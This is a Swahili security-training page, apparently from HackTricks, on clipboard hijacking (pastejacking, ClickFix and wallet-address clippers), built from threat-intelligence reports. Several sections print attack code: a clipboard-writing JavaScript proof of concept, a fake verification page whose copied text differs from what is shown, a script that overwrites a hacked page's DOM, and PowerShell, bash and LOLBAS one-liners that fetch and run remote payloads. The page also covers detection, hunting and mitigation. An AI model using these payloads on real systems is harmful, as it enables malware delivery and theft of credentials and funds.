# Mashambulizi ya Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Usibandike kamwe kitu ambacho hukukinakili wewe mwenyewe." – ushauri wa zamani lakini bado unafaa

## Muhtasari

Clipboard hijacking – inayojulikana pia kama *pastejacking* – hutumia ukweli kwamba watumiaji mara kwa mara hunakili na kubandika amri bila kuzikagua. Ukurasa hasidi wa wavuti (au muktadha wowote unaoweza kutumia JavaScript, kama programu ya Electron au ya Desktop) huweka maandishi yanayodhibitiwa na mshambuliaji kwenye clipboard ya mfumo kwa njia ya programu. Wahasiriwa huelekezwa, kwa kawaida kupitia maagizo yaliyoundwa kwa uangalifu ya social engineering, kubonyeza **Win + R** (kidirisha cha Run), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *kubandika* maudhui ya clipboard, na hivyo kutekeleza mara moja amri zozote.

Kwa kuwa **hakuna faili inayopakuliwa wala kiambatisho kinachofunguliwa**, mbinu hii hupita udhibiti mwingi wa usalama wa barua pepe na maudhui ya wavuti unaofuatilia viambatisho, macros au utekelezaji wa amri moja kwa moja. Kwa hiyo, shambulizi hili hupendwa katika kampeni za phishing zinazosambaza familia za malware za kawaida kama NetSupport RAT, Latrodectus loader au Lumma Stealer.<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

Aina nyingine ya **clipboard hijacking** haibandiki amri hata kidogo: husubiri hadi mwathiriwa anapokili **anwani ya cryptocurrency wallet**, kisha huibadilisha kimyakimya na kuweka ya mshambuliaji kabla tu ya kubandika. Hii hufanya kazi vizuri hasa kwa miundo mirefu ya wallet kwa sababu watumiaji mara nyingi hukagua herufi za mwanzo/mwisho pekee.<sup>[[8]](#references)</sup>

Sifa zinazopatikana mara nyingi katika matukio halisi:
- **Thin loader + nested payload**: programu/exe inayoonekana hufanana na zana halali ya trading au "profit", huku clipper halisi ikiwa imefichwa ndani zaidi ya kifurushi (kwa mfano, .NET loader ikizindua payload ya Rust iliyojificha ndani).
- **Regex-driven replacement**: malware hutafuta mifuatano kama `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, au hata mifuatano ya jumla ya **herufi 44 inayofanana na ya Solana**, kisha huiandika upya na kuweka anwani za wallet za mshambuliaji.
- **Wallet rotation at scale**: sampuli za kisasa za Windows zinaweza kujumuisha **maelfu** ya anwani mbadala za kila currency badala ya anwani moja isiyobadilika, na hivyo kupunguza kuharibika kwa sifa ya wallet baada ya kila wizi.<sup>[[8]](#references)</sup>

### Mtiririko wa clipper ya Windows

Utekelezaji wa kawaida ni dirisha lililofichwa lililosajiliwa kwa **`AddClipboardFormatListener`**. Kila clipboard inaposasishwa, malware kwa kawaida huita:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → kufikia data ya sasa ya clipboard.
- **`GetClipboardData`** → kusoma maandishi.
- **`EmptyClipboard`** + **`SetClipboardData`** → kubadilisha mfuatano wa wallet na thamani ya mshambuliaji.

Regex za chini kabisa za hunting zinazoonekana mara nyingi kwenye clippers:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

Persistence ya kiwango cha mtumiaji inatosha kuleta athari. Muundo mmoja ulioonekana ni:<sup>[[8]](#references)</sup>
- Nakili payload hadi **`%APPDATA%\silke\silke.exe`**
- Unda **LNK katika folda ya Startup** chini ya `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Mawazo ya utambuzi:
- Michakato inayoita clipboard APIs mfululizo huku ikiandika pia ndani ya `%APPDATA%` na folda ya mtumiaji ya **Startup**.
- Uundaji wa LNK/executable mpya, kisha kubadilishwa kwa anwani za wallet kwenye clipboard.
- Kumbukumbu au vifurushi vya programu ghushi vilivyo na faili nyingi zisizotumika pamoja na launcher ndogo inayoanzisha binary iliyofichwa ndani yake.

### Kuondoa quarantine kwa hadaa ya kijamii kwenye macOS + persistence ya LaunchAgent

Kwenye macOS, baadhi ya kampeni husambaza helper ya **`unlocker.command`** na kumwelekeza mwathiriwa kubofya kulia → **Open** ikiwa Gatekeeper itasema programu imeharibika au imetoka kwa msanidi programu asiyejulikana. Script hiyo huondoa tu quarantine na kuzindua `.app` iliyo karibu nayo:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Hii **si** exploit ya Gatekeeper; ni **social-engineered quarantine bypass** inayotumia ukweli kwamba maamuzi ya Gatekeeper hutegemea xattr ya `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Baada ya kutekelezwa, clipper inaweza kudumu kama mtumiaji wa sasa kwa kuandika:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script ya wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent yenye `RunAtLoad` na `KeepAlive`

Maelezo muhimu ya kujilinda ni kwamba baadhi ya sampuli hutumia **self-healing watchdog** inayoandika upya LaunchAgent na wrapper takriban kila sekunde 30. Ukiondoa plist kwanza **bila kusitisha mchakato unaoendelea**, malware inaweza kuiunda tena mara moja.<sup>[[8]](#references)</sup> Mpangilio salama wa usafishaji:
1. Sitisha mchakato wa clipper unaotumika.
2. Ondoa au futa plist ya LaunchAgent.
3. Futa `~/launch.sh` na payload iliyonakiliwa.

### Dokezo la uwasilishaji: sifa bandia kama kichocheo cha ziada

Kwa familia hii, malware yenyewe inaweza kubaki rahisi kiufundi huku **tabaka la usambazaji** likifanya kazi kubwa: stars/forks bandia za GitHub, reviews/downloads za SourceForge, comments/views za mafunzo ya YouTube, na comments/votes zisizo na madhara kwenye VirusTotal hutumiwa kufanya binary ionekane ya kuaminika kabla ya kutekelezwa.<sup>[[8]](#references)</sup>

## Vitufe vya kunakili vinavyolazimishwa na payloads zilizofichwa (macOS one-liners)

Baadhi ya infostealers za macOS huiga tovuti za visakinishi (kwa mfano, Homebrew) na **kulazimisha matumizi ya kitufe cha “Copy”** ili watumiaji wasiweze kuangazia maandishi yanayoonekana pekee. Ingizo la clipboard huwa na amri ya kisakinishi inayotarajiwa pamoja na payload ya Base64 iliyoongezwa (kwa mfano, `...; echo <b64> | base64 -d | sh`), hivyo kubandika mara moja hutekeleza vyote viwili huku UI ikificha hatua ya ziada.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Kampeni za zamani zilitumia `document.execCommand('copy')`, huku mpya zikitumia **Clipboard API** ya asynchronous (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Mtiririko wa ClickFix / ClearFake

1. Mtumiaji hutembelea tovuti yenye jina lililoandikwa kimakosa kwa makusudi au tovuti iliyoathiriwa (mfano, `docusign.sa[.]com`)
2. JavaScript ya **ClearFake** iliyoingizwa huitisha helper ya `unsecuredCopyToClipboard()` ambayo huhifadhi kimyakimya PowerShell one-liner iliyosimbwa kwa Base64 kwenye clipboard.
3. Maelekezo ya HTML humwambia mwathiriwa: *“Bonyeza **Win + R**, bandika amri kisha ubonyeze Enter ili kutatua tatizo.”*
4. `powershell.exe` hutekelezwa na kupakua archive iliyo na executable halali pamoja na DLL hasidi (DLL sideloading ya kawaida).
5. Loader husimbua stages za ziada, hudunga shellcode na kusakinisha persistence (mfano, scheduled task) – hatimaye huendesha NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Mlolongo wa NetSupport RAT wa Mfano

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (Java WebStart halali) hutafuta `msvcp140.dll` katika saraka yake.
* DLL hasidi hutatua API kwa nguvu kwa kutumia **GetProcAddress**, hupakua faili mbili za binary (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, huzifungua kwa kutumia ufunguo wa XOR unaobadilika `"https://google.com/"`, huingiza shellcode ya mwisho na kufungua **client32.exe** (NetSupport RAT) katika `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Inapakua `la.txt` kwa kutumia **curl.exe**
2. Huendesha JScript downloader ndani ya **cscript.exe**
3. Hupakua MSI payload → huweka `libcef.dll` karibu na application iliyosainiwa → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer kupitia MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

Wito wa **mshta** huzindua script fiche ya PowerShell inayopakua `PartyContinued.exe`, kutoa `Boat.pst` (CAB), kujenga upya `AutoIt3.exe` kupitia `extrac32` na kuunganisha faili, kisha kuendesha script ya `.a3x` inayofanya exfiltration ya vitambulisho vya kuingia kwenye browser kwenda `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Ubao wa kunakili → PowerShell → JS eval → LNK ya kuanzisha mfumo yenye C2 inayobadilika (PureHVNC)

Baadhi ya kampeni za ClickFix huruka kabisa upakuaji wa faili na badala yake kuwaelekeza wahasiriwa kubandika one-liner inayopakua na kutekeleza JavaScript kupitia WSH, kuiweka ianze kiotomatiki, na kubadilisha C2 kila siku. Mlolongo wa mfano ulioonekana:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Sifa muhimu
- URL iliyofichwa hubadilishwa mwelekeo wakati wa utekelezaji ili kuzuia ukaguzi wa juu juu.
- JavaScript hujiendeleza kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa — hivyo kuwezesha ubadilishaji wa haraka wa domain.<sup>[[3]](#references)</sup>

Kipande kidogo cha JS kinachotumiwa kuzungusha C2 kulingana na tarehe:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Hatua inayofuata kwa kawaida hupeleka loader inayoweka persistence na kupakua RAT (k.m., PureHVNC), mara nyingi ikiweka TLS pinning kwa certificate iliyowekwa hardcode na kugawa traffic katika vipande.<sup>[[3]](#references)</sup>

Mawazo ya utambuzi mahususi kwa variant hii
- Mti wa process: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (au `cscript.exe`).
- Artifacts za startup: LNK ndani ya `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` inayoanzisha WScript/CScript ikiwa na njia ya JS chini ya `%TEMP%`/`%APPDATA%`.
- Telemetry ya Registry/RunMRU na command-line iliyo na `.split('').reverse().join('')` au `eval(a.responseText)`.
- `powershell -NoProfile -NonInteractive -Command -` zinazojirudia na payload kubwa za stdin ili kupitisha scripts ndefu bila command line ndefu.
- Scheduled Tasks ambazo baadaye hutekeleza LOLBins kama `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` chini ya task/njia inayoonekana kuwa ya updater (k.m., `\GoogleSystem\GoogleUpdater`).

Uwindaji wa vitisho
- C2 hostnames na URLs zinazobadilika kila siku zenye muundo wa `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Linganisha matukio ya kuandika clipboard yanayofuatwa na kubandika kupitia Win+R, kisha utekelezaji wa `powershell.exe` mara moja.

Blue-teams zinaweza kuchanganya telemetry ya clipboard, uundaji wa process na registry ili kubaini matumizi mabaya ya pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` huhifadhi historia ya amri za **Win + R** – tafuta entries zisizo za kawaida za Base64 / zilizofichwa.
* Security Event ID **4688** (Uundaji wa Process) ambapo `ParentImage` == `explorer.exe` na `NewProcessName` ni mojawapo ya { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** ya uundaji wa faili chini ya `%LocalAppData%\Microsoft\Windows\WinX\` au folda za muda muda mfupi kabla ya tukio la kutiliwa shaka la 4688.
* Vihisi vya clipboard vya EDR (ikiwa vipo) – linganisha `Clipboard Write` inayofuatwa mara moja na process mpya ya PowerShell.

## Kurasa za uthibitishaji za mtindo wa IUAM (ClickFix Generator): kunakili clipboard hadi console + payload zinazotambua OS

Kampeni za hivi majuzi huzalisha kwa wingi kurasa ghushi za uthibitishaji wa CDN/browser ("Just a moment…", za mtindo wa IUAM) zinazowashawishi watumiaji kunakili amri mahususi kwa OS kutoka kwenye clipboard na kuziingiza kwenye consoles asilia. Hii huhamisha utekelezaji nje ya sandbox ya browser na hufanya kazi kwenye Windows na macOS.<sup>[[4]](#references)</sup>

Sifa kuu za kurasa zinazozalishwa na builder
- Utambuzi wa OS kupitia `navigator.userAgent` ili kurekebisha payloads (Windows PowerShell/CMD dhidi ya macOS Terminal). Decoys/no-ops za hiari kwa OS zisizotumika ili kudumisha udanganyifu.
- Kunakili clipboard kiotomatiki wakati wa vitendo salama vya UI (checkbox/Copy), huku maandishi yanayoonekana yakitofautiana na yaliyomo kwenye clipboard.
- Kuzuia matumizi ya simu na popover yenye maelekezo ya hatua kwa hatua: Windows → Win+R→bandika→Enter; macOS → fungua Terminal→bandika→Enter.
- Obfuscation ya hiari na injector ya faili moja ya kubadilisha DOM ya tovuti iliyoathiriwa na UI ya uthibitishaji iliyopambwa kwa Tailwind (hakuna haja ya kusajili domain mpya).<sup>[[4]](#references)</sup>

Mfano: kutolingana kwa clipboard + matawi yanayotambua OS
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOS persistence ya utekelezaji wa awali
- Tumia `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ili utekelezaji uendelee baada ya terminal kufungwa, na hivyo kupunguza athari zinazoonekana.<sup>[[4]](#references)</sup>

Utekaji wa ukurasa papo hapo kwenye tovuti zilizoathiriwa na uvamizi
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Mawazo ya utambuzi na utafutaji mahususi kwa chambo cha mtindo wa IUAM
- Web: Kurasa zinazounganisha Clipboard API na wijeti za uthibitishaji; kutolingana kwa maandishi yanayoonyeshwa na maudhui ya clipboard; matawi ya `navigator.userAgent`; Tailwind + ubadilishaji wa ukurasa mmoja katika miktadha inayotia shaka.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` muda mfupi baada ya mwingiliano na browser; installers za batch/MSI zinazoendeshwa kutoka `%TEMP%`.
- macOS endpoint: Terminal/iTerm kuanzisha `bash`/`curl`/`base64 -d` pamoja na `nohup` karibu na matukio ya browser; kazi za chinichini zinazoendelea baada ya kufunga terminal.
- Linganisha historia ya `RunMRU` Win+R na uandikaji kwenye clipboard na uundaji unaofuata wa michakato ya console.

Tazama pia mbinu saidizi

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mageuzi ya 2026 ya CAPTCHA bandia / ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake inaendelea kuhatarisha tovuti za WordPress na kuingiza loader JavaScript inayounganisha hosts za nje (Cloudflare Workers, GitHub/jsDelivr) na hata miito ya blockchain ya “etherhiding” (kwa mfano, POSTs kwa endpoint za API za Binance Smart Chain kama `bsc-testnet.drpc[.]org`) ili kupata mantiki ya sasa ya chambo. Overlays za hivi karibuni hutumia sana CAPTCHA bandia zinazowaelekeza watumiaji kunakili/kubandika one-liner (T1204.004) badala ya kupakua chochote.<sup>[[6]](#references)</sup>
- Utekelezaji wa awali unazidi kukabidhiwa kwa hosts za script zilizosainiwa/LOLBAS. Msururu wa Januari 2026 ulibadilisha matumizi ya awali ya `mshta` na kutumia `SyncAppvPublishingServer.vbs` iliyojengewa ndani, inayoendeshwa kupitia `WScript.exe`, na kupitisha argument zinazofanana na za PowerShell zenye aliases/wildcards ili kupata maudhui ya mbali:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` imesainiwa na kwa kawaida hutumiwa na App-V; ikiunganishwa na `WScript.exe` na hoja zisizo za kawaida (majina mbadala ya `gal`/`gcm`, cmdlets zenye wildcard, URL za jsDelivr) inakuwa hatua ya LOLBAS yenye viashiria vingi vya ClearFake.<sup>[[6]](#references)</sup>
- Payload za CAPTCHA bandia za Februari 2026 zilirudi kutumia download cradles za PowerShell pekee. Mifano miwili inayotumika sasa:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - Msururu wa kwanza ni grabber ya `iex(irm ...)` inayofanya kazi kwenye memory; wa pili hutumia `WinHttp.WinHttpRequest.5.1`, huandika faili ya muda ya `.ps1`, kisha huizindua kwa `-ep bypass` kwenye dirisha lililofichwa.<sup>[[6]](#references)</sup>

Vidokezo vya ugunduzi/uwindaji wa vibadala hivi
- Mfuatano wa michakato: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` au PowerShell cradles mara tu baada ya kuandika kwenye clipboard/Win+R.
- Maneno muhimu ya command line: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domains za jsDelivr/GitHub/Cloudflare Worker, au mifumo ya anwani ghafi za IP `iex(irm ...)`.
- Network: miunganisho ya nje kwenda kwa hosts za CDN worker au endpoints za blockchain RPC kutoka kwa script hosts/PowerShell muda mfupi baada ya kuvinjari wavuti.
- Faili/registry: kuundwa kwa `.ps1` ya muda chini ya `%TEMP%` pamoja na maingizo ya RunMRU yenye one-liners hizi; zuia/toa tahadhari kuhusu LOLBAS za signed-script (WScript/cscript/mshta) zinazoendeshwa zikiwa na URLs za nje au strings za alias zilizofichwa.

## Mbinu za ClickFix za Juni 2026: telemetry ya kubandika, maoni bandia ya uthibitishaji, na kuunganisha LOLBin

Telemetry ya hivi karibuni ya Red Canary inaonyesha kuwa kiashiria thabiti **si command moja mahususi**, bali ni mchanganyiko wa **kubandika na kuendesha kwa msaada wa mtumiaji**, **interpreters/LOLBins zinazoaminika**, **flags zilizofichwa**, **upakuaji wa mbali**, na **utekelezaji wa mara moja**.<sup>[[7]](#references)</sup>

### Miundo mashuhuri ya waendeshaji

- **Telemetry ya uthibitisho wa kubandika**: baadhi ya payloads huita `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` kabla ya hatua halisi. Hii huthibitisha mwingiliano wa mtumiaji huku dirisha likiwa wazi kwa muda mfupi na bila kuvutia umakini.
- **Maoni bandia ya uthibitishaji**: one-liners za PowerShell zinaweza kuongeza strings kama `# Security check ✔️ I'm not a robot Verification ID: 138105` ili command bado ionekane inahusiana na CAPTCHA baada ya kubandikwa kwenye Run / historia ya `cmd.exe` / PowerShell.
- **Uundaji upya wa URL kwa nguvu**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` huepuka URL tuli kwenye command line huku ikiendelea kupakua na kutekeleza code kwenye memory.
- **Utekelezaji wa installer iliyojificha**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` hutumia mchanganyiko usio wa kawaida wa herufi kubwa na ndogo pamoja na herufi zinazofanana na Unicode kwenye flags ili kuvuruga detections zisizobadilika, huku bado ikifanana na `msiexec.exe`.
- **Mizunguko ya LOLBin iliyofichwa kwa caret**: `cmd.exe` inaweza kuficha maneno muhimu kwa escapes za `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), kuwasha shell iliyopachikwa ikiwa imepunguzwa, kuhifadhi maudhui ya mshambuliaji kwa extension isiyo na shaka kama `.pdf`, kisha kuyatekeleza kupitia `mshta`.<sup>[[7]](#references)</sup>
## Hatua za kupunguza hatari

1. Kuimarisha browser – zima ruhusa ya kuandika kwenye clipboard (`dom.events.asyncClipboard.clipboardItem` n.k.) au hitaji ishara ya mtumiaji.
2. Uhamasishaji wa usalama – wafundishe watumiaji *kuandika* commands nyeti au kuzibandika kwanza kwenye text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ili kuzuia one-liners zisizoidhinishwa.
4. Udhibiti wa network – zuia maombi ya nje kwenda kwenye domains zinazojulikana za pastejacking na malware C2.

## Mbinu Zinazohusiana

* **Utekaji wa Discord Invite** mara nyingi hutumia mbinu ileile ya ClickFix baada ya kuwanasa watumiaji waingie kwenye server hasidi:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Rekebisha Click: Kuzuia Njia ya Mashambulizi ya ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Chini ya Pazia Safi: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Kiwanda cha ClickFix: Ufichuzi wa Kwanza wa Jenereta ya IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, mwaka wa Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Maarifa ya Ujasusi: Februari 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Maarifa ya Ujasusi: Juni 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Kutoka Stars hadi Upvotes: Sifa Bandia Zinavyochochea Mtekaji wa Clipboard ya Crypto](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
